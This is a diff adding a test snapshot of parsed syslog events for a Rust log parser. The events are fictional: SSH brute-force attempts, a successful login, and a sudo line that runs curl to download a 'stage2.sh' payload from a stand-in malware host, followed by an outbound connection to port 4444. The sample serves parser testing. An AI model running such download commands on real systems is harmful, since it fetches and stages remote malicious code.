@@ -1,0 +1,76 @@
+---
+source: crates/sudare-core/tests/parsers.rs
+expression: events
+---
+- lines:
+    - 1
+    - 1
+  timestamp: "Oct 29 14:11:40"
+  group: sshd
+  error: ~
+  fields:
+    pri: "34"
+    timestamp: "Oct 29 14:11:40"
+    hostname: fw01
+    app: sshd
+    pid: "2211"
+    message: Failed password for jdoe from 198.51.100.23 port 51122 ssh2
+- lines:
+    - 2
+    - 2
+  timestamp: "Oct 29 14:11:42"
+  group: sshd
+  error: ~
+  fields:
+    pri: "34"
+    timestamp: "Oct 29 14:11:42"
+    hostname: fw01
+    app: sshd
+    pid: "2211"
+    message: Failed password for jdoe from 198.51.100.23 port 51123 ssh2
+- lines:
+    - 3
+    - 3
+  timestamp: "Oct 29 14:12:05"
+  group: sshd
+  error: ~
+  fields:
+    pri: "38"
+    timestamp: "Oct 29 14:12:05"
+    hostname: fw01
+    app: sshd
+    pid: "2211"
+    message: Accepted password for jdoe from 198.51.100.23 port 51130 ssh2
+- lines:
+    - 4
+    - 4
+  timestamp: "Oct 29 14:12:06"
+  group: sudo
+  error: ~
+  fields:
+    pri: "86"
+    timestamp: "Oct 29 14:12:06"
+    hostname: fw01
+    app: sudo
+    TTY: pts/0
+    PWD: /home/jdoe
+    USER: root
+    COMMAND: /usr/bin/curl
+    message: "    jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/x http://malware.example.org/stage2.sh"
+- lines:
+    - 5
+    - 5
+  timestamp: "Oct 29 14:12:09"
+  group: kernel
+  error: ~
+  fields:
+    pri: "14"
+    timestamp: "Oct 29 14:12:09"
+    hostname: fw01
+    app: kernel
+    src: 192.0.2.15
+    dst: 203.0.113.50
+    dpt: "4444"
+    user: jdoe
+    host: ws-17.corp.example.com
+    message: OUTBOUND conn src=192.0.2.15 dst=203.0.113.50 dpt=4444 user=jdoe host=ws-17.corp.example.com
